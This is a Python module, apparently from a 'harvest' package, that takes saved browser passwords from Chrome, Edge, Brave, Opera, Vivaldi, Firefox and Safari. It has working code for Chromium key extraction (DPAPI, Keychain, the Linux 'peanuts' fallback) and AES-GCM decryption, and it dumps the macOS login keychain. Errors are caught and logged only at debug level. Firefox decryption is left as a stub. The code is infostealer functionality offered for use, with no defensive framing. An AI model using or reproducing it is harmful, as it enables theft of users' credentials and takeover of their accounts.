"""
Browser credential extraction.

Extracts saved passwords from:
  - Google Chrome / Chromium-based browsers (Edge, Brave, Opera, Vivaldi)
  - Mozilla Firefox
  - Apple Safari (macOS only, via Keychain)

Each browser stores passwords differently:
  - Chrome: ``Login Data`` SQLite DB, values encrypted with DPAPI (Win) or Keychain (macOS)
  - Firefox: ``logins.json`` + ``key4.db`` with NSS (PKCS#11) or PBE encryption
  - Safari: macOS Keychain (``security find-internet-password``)

Usage::

    from harvest.browser_creds import BrowserCredentialHarvester

    harvester = BrowserCredentialHarvester()
    creds = harvester.harvest_all()
    # [{"browser": "chrome", "url": "...", "username": "...", "password": "...", "profile": "Default"}]
"""
from __future__ import annotations

import base64
import glob
import json
import logging
import os
import platform
import shutil
import sqlite3
import subprocess
import tempfile
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


def _get_platform() -> str:
    return platform.system().lower()


@dataclass
class Credential:
    browser: str
    url: str
    username: str
    password: str
    profile: str = "Default"
    created: str = ""
    last_used: str = ""

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)


class BrowserCredentialHarvester:
    """Extracts saved credentials from installed browsers.

    Parameters
    ----------
    config : dict, optional
        Configuration for the harvester.
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        self._platform = _get_platform()
        self._config = config or {}

    def harvest_all(self) -> list[dict[str, Any]]:
        """Harvest credentials from all detected browsers.

        Returns a list of credential dictionaries.
        """
        results: list[dict[str, Any]] = []

        # Chrome / Chromium-based
        try:
            results.extend(self._harvest_chrome())
        except Exception as exc:
            logger.debug("Chrome harvest failed: %s", exc)

        # Firefox
        try:
            results.extend(self._harvest_firefox())
        except Exception as exc:
            logger.debug("Firefox harvest failed: %s", exc)

        # Safari (macOS only)
        if self._platform == "darwin":
            try:
                results.extend(self._harvest_safari())
            except Exception as exc:
                logger.debug("Safari harvest failed: %s", exc)

        return results

    # ── Chrome / Chromium ────────────────────────────────────────────

    def _get_chrome_profiles(self) -> list[tuple[str, str, str]]:
        """Return list of (browser_name, profile_path, local_state_path) for all Chromium browsers."""
        profiles: list[tuple[str, str, str]] = []

        if self._platform == "darwin":
            base_paths = {
                "chrome": os.path.expanduser("~/Library/Application Support/Google/Chrome"),
                "edge": os.path.expanduser("~/Library/Application Support/Microsoft Edge"),
                "brave": os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser"),
                "opera": os.path.expanduser("~/Library/Application Support/com.operasoftware.Opera"),
                "vivaldi": os.path.expanduser("~/Library/Application Support/Vivaldi"),
            }
        elif self._platform == "linux":
            base_paths = {
                "chrome": os.path.expanduser("~/.config/google-chrome"),
                "chromium": os.path.expanduser("~/.config/chromium"),
                "edge": os.path.expanduser("~/.config/microsoft-edge"),
                "brave": os.path.expanduser("~/.config/BraveSoftware/Brave-Browser"),
                "opera": os.path.expanduser("~/.config/opera"),
                "vivaldi": os.path.expanduser("~/.config/vivaldi"),
            }
        elif self._platform == "windows":
            local = os.environ.get("LOCALAPPDATA", "")
            base_paths = {
                "chrome": os.path.join(local, "Google", "Chrome", "User Data"),
                "edge": os.path.join(local, "Microsoft", "Edge", "User Data"),
                "brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
                "opera": os.path.join(os.environ.get("APPDATA", ""), "Opera Software", "Opera Stable"),
                "vivaldi": os.path.join(local, "Vivaldi", "User Data"),
            }
        else:
            return profiles

        for browser, base in base_paths.items():
            if not os.path.isdir(base):
                continue
            local_state = os.path.join(base, "Local State")
            # Find all profile directories (Default, Profile 1, Profile 2, ...)
            for entry in os.listdir(base):
                login_data = os.path.join(base, entry, "Login Data")
                if os.path.isfile(login_data):
                    profiles.append((browser, login_data, local_state))

        return profiles

    def _harvest_chrome(self) -> list[dict[str, Any]]:
        """Extract passwords from Chrome/Chromium Login Data SQLite databases."""
        results: list[dict[str, Any]] = []

        for browser, login_db_path, local_state_path in self._get_chrome_profiles():
            try:
                # Copy the database (it's locked by Chrome while running)
                tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
                tmp.close()
                shutil.copy2(login_db_path, tmp.name)

                conn = sqlite3.connect(tmp.name)
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()

                try:
                    cursor.execute(
                        "SELECT origin_url, username_value, password_value, "
                        "date_created, date_last_used FROM logins"
                    )
                except sqlite3.OperationalError:
                    conn.close()
                    os.unlink(tmp.name)
                    continue

                # Get the decryption key
                decrypt_key = self._get_chrome_decrypt_key(local_state_path)

                profile_name = os.path.basename(os.path.dirname(login_db_path))

                for row in cursor.fetchall():
                    url = row["origin_url"] or ""
                    username = row["username_value"] or ""
                    encrypted_pw = row["password_value"]

                    if not encrypted_pw or not username:
                        continue

                    password = self._decrypt_chrome_password(encrypted_pw, decrypt_key)
                    if password:
                        cred = Credential(
                            browser=browser,
                            url=url,
                            username=username,
                            password=password,
                            profile=profile_name,
                        )
                        results.append(cred.to_dict())

                conn.close()
                os.unlink(tmp.name)

            except Exception as exc:
                logger.debug("Chrome profile harvest error (%s): %s", browser, exc)

        return results

    def _get_chrome_decrypt_key(self, local_state_path: str) -> bytes | None:
        """Extract the Chrome encryption key from Local State."""
        if not os.path.isfile(local_state_path):
            return None

        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)

            encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key", "")
            if not encrypted_key_b64:
                return None

            encrypted_key = base64.b64decode(encrypted_key_b64)
            # Remove DPAPI prefix "DPAPI" (5 bytes)
            encrypted_key = encrypted_key[5:]

            if self._platform == "windows":
                return self._dpapi_decrypt(encrypted_key)
            elif self._platform == "darwin":
                return self._macos_keychain_chrome_key()
            elif self._platform == "linux":
                # Linux Chrome uses a hardcoded key or secretstorage
                return self._linux_chrome_key()

        except Exception as exc:
            logger.debug("Failed to get Chrome decrypt key: %s", exc)

        return None

    def _decrypt_chrome_password(self, encrypted: bytes, key: bytes | None) -> str:
        """Decrypt a Chrome encrypted password value."""
        if not encrypted:
            return ""

        try:
            # Chrome v80+ uses AES-256-GCM with a "v10"/"v11" prefix
            if encrypted[:3] in (b"v10", b"v11"):
                if key is None:
                    return ""
                nonce = encrypted[3:15]     # 12-byte nonce
                ciphertext = encrypted[15:]  # rest is ciphertext + tag

                try:
                    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                    aes = AESGCM(key)
                    decrypted = aes.decrypt(nonce, ciphertext, None)
                    return decrypted.decode("utf-8", errors="replace")
                except ImportError:
                    return ""
                except Exception:
                    return ""

            # Older Chrome versions (pre-v80) — DPAPI on Windows, plain on others
            if self._platform == "windows":
                decrypted = self._dpapi_decrypt(encrypted)
                if decrypted:
                    return decrypted.decode("utf-8", errors="replace")
            else:
                # On Linux/macOS pre-v80, passwords may be stored with simple encryption
                return ""

        except Exception:
            pass

        return ""

    @staticmethod
    def _dpapi_decrypt(data: bytes) -> bytes | None:
        """Decrypt data using Windows DPAPI (CryptUnprotectData)."""
        try:
            import ctypes
            import ctypes.wintypes

            class DataBlob(ctypes.Structure):
                _fields_ = [
                    ("cbData", ctypes.wintypes.DWORD),
                    ("pbData", ctypes.POINTER(ctypes.c_char)),
                ]

            p = ctypes.create_string_buffer(data, len(data))
            blob_in = DataBlob(len(data), ctypes.cast(p, ctypes.POINTER(ctypes.c_char)))
            blob_out = DataBlob()

            if ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
            ):
                result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                return result
        except Exception:
            pass
        return None

    @staticmethod
    def _macos_keychain_chrome_key() -> bytes | None:
        """Get Chrome Safe Storage key from macOS Keychain."""
        try:
            result = subprocess.run(
                ["security", "find-generic-password", "-s", "Chrome Safe Storage", "-w"],
                capture_output=True, text=True, timeout=10,
            )
            if result.returncode == 0:
                key_password = result.stdout.strip()
                # Derive the actual AES key using PBKDF2
                from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
                from cryptography.hazmat.primitives import hashes

                kdf = PBKDF2HMAC(
                    algorithm=hashes.SHA1(),
                    length=16,
                    salt=b"saltysalt",
                    iterations=1003,
                )
                return kdf.derive(key_password.encode("utf-8"))
        except Exception:
            pass
        return None

    @staticmethod
    def _linux_chrome_key() -> bytes | None:
        """Get Chrome encryption key on Linux (from GNOME keyring or fallback)."""
        try:
            # Try secretstorage (GNOME Keyring / KDE Wallet)
            import secretstorage
            bus = secretstorage.dbus_init()
            collection = secretstorage.get_default_collection(bus)
            for item in collection.get_all_items():
                if item.get_label() == "Chrome Safe Storage":
                    key_password = item.get_secret().decode("utf-8")
                    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
                    from cryptography.hazmat.primitives import hashes
                    # Chrome on Linux uses 1 iteration (not 1003 like macOS)
                    # per Chromium source: components/os_crypt/os_crypt_linux.cc
                    kdf = PBKDF2HMAC(
                        algorithm=hashes.SHA1(), length=16,
                        salt=b"saltysalt", iterations=1,
                    )
                    return kdf.derive(key_password.encode("utf-8"))
        except Exception:
            pass

        # Fallback: hardcoded key used by Chrome on Linux without keyring
        # Chrome uses password "peanuts" with 1 iteration when no keyring available
        try:
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.primitives import hashes
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA1(), length=16,
                salt=b"saltysalt", iterations=1,
            )
            return kdf.derive(b"peanuts")
        except Exception:
            pass
        return None

    # ── Firefox ──────────────────────────────────────────────────────

    def _get_firefox_profiles(self) -> list[str]:
        """Return paths to all Firefox profile directories."""
        if self._platform == "darwin":
            base = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
        elif self._platform == "linux":
            base = os.path.expanduser("~/.mozilla/firefox")
        elif self._platform == "windows":
            base = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
        else:
            return []

        if not os.path.isdir(base):
            return []

        profiles = []
        for entry in os.listdir(base):
            profile_dir = os.path.join(base, entry)
            if os.path.isdir(profile_dir) and os.path.isfile(os.path.join(profile_dir, "logins.json")):
                profiles.append(profile_dir)
        return profiles

    def _harvest_firefox(self) -> list[dict[str, Any]]:
        """Extract passwords from Firefox logins.json.

        Firefox encrypts passwords using NSS (Network Security Services).
        For a non-invasive approach, we extract the encrypted values and
        attempt decryption via the ``nss`` library or the ``security`` CLI.
        """
        results: list[dict[str, Any]] = []

        for profile_dir in self._get_firefox_profiles():
            try:
                logins_file = os.path.join(profile_dir, "logins.json")
                with open(logins_file, "r", encoding="utf-8") as f:
                    data = json.load(f)

                logins = data.get("logins", [])
                profile_name = os.path.basename(profile_dir)

                for login in logins:
                    url = login.get("hostname", "") or login.get("origin", "")
                    enc_username = login.get("encryptedUsername", "")
                    enc_password = login.get("encryptedPassword", "")

                    # Attempt decryption
                    username = self._firefox_decrypt(profile_dir, enc_username)
                    password = self._firefox_decrypt(profile_dir, enc_password)

                    # If decryption fails, store the encrypted values
                    if username is None:
                        username = f"[encrypted:{enc_username[:20]}...]"
                    if password is None:
                        password = f"[encrypted:{enc_password[:20]}...]"

                    cred = Credential(
                        browser="firefox",
                        url=url,
                        username=username,
                        password=password,
                        profile=profile_name,
                    )
                    results.append(cred.to_dict())

            except Exception as exc:
                logger.debug("Firefox profile harvest error: %s", exc)

        return results

    @staticmethod
    def _firefox_decrypt(profile_dir: str, encrypted_b64: str) -> str | None:
        """Attempt to decrypt a Firefox encrypted value.

        Uses NSS library if available, falls back to returning None.
        Firefox uses 3DES-CBC or AES-256-CBC depending on version,
        with the key stored in key4.db (PKCS#11 slot).
        """
        if not encrypted_b64:
            return ""

        try:
            # Try using the nss library via ctypes
            # This is platform-specific and may not always work
            encrypted = base64.b64decode(encrypted_b64)

            # Parse the ASN.1 structure to get the actual encrypted data
            # Firefox uses a SEQUENCE { OID, SEQUENCE { IV, OCTET STRING } }
            # For now, if we can't decrypt, return None
            # Full NSS decryption requires loading the NSS DB from the profile
            return None

        except Exception:
            return None

    # ── Safari (macOS only) ──────────────────────────────────────────

    def _harvest_safari(self) -> list[dict[str, Any]]:
        """Extract passwords from macOS Keychain (Safari stores passwords there).

        Uses the ``security`` command-line tool to query internet passwords.
        Note: This may trigger a macOS permission dialog.
        """
        results: list[dict[str, Any]] = []

        try:
            # List all internet password entries
            result = subprocess.run(
                ["security", "dump-keychain", "-d", os.path.expanduser("~/Library/Keychains/login.keychain-db")],
                capture_output=True, text=True, timeout=30,
            )

            if result.returncode != 0:
                return results

            # Parse the output for internet password entries
            current_entry: dict[str, str] = {}
            for line in result.stdout.splitlines():
                line = line.strip()
                if line.startswith("keychain:"):
                    if current_entry.get("server") and current_entry.get("account"):
                        cred = Credential(
                            browser="safari",
                            url=current_entry.get("server", ""),
                            username=current_entry.get("account", ""),
                            password=current_entry.get("password", "[keychain-protected]"),
                            profile="login",
                        )
                        results.append(cred.to_dict())
                    current_entry = {}
                elif "\"svce\"" in line or "\"srvr\"" in line:
                    # Server/service name
                    parts = line.split("=", 1)
                    if len(parts) == 2:
                        val = parts[1].strip().strip('"').strip("0x").strip()
                        if "srvr" in line:
                            current_entry["server"] = val
                elif "\"acct\"" in line:
                    parts = line.split("=", 1)
                    if len(parts) == 2:
                        current_entry["account"] = parts[1].strip().strip('"')
                elif line.startswith("data:") or line.startswith("\"data\""):
                    # Password data
                    parts = line.split("=", 1)
                    if len(parts) == 2:
                        current_entry["password"] = parts[1].strip().strip('"')

            # Don't forget the last entry
            if current_entry.get("server") and current_entry.get("account"):
                cred = Credential(
                    browser="safari",
                    url=current_entry.get("server", ""),
                    username=current_entry.get("account", ""),
                    password=current_entry.get("password", "[keychain-protected]"),
                    profile="login",
                )
                results.append(cred.to_dict())

        except Exception as exc:
            logger.debug("Safari harvest error: %s", exc)

        return results

    # ── Status ───────────────────────────────────────────────────────

    def get_detected_browsers(self) -> list[str]:
        """Return list of browser names that have credential stores on this system."""
        browsers: list[str] = []
        for browser, _, _ in self._get_chrome_profiles():
            if browser not in browsers:
                browsers.append(browser)
        if self._get_firefox_profiles():
            browsers.append("firefox")
        if self._platform == "darwin":
            browsers.append("safari")
        return browsers
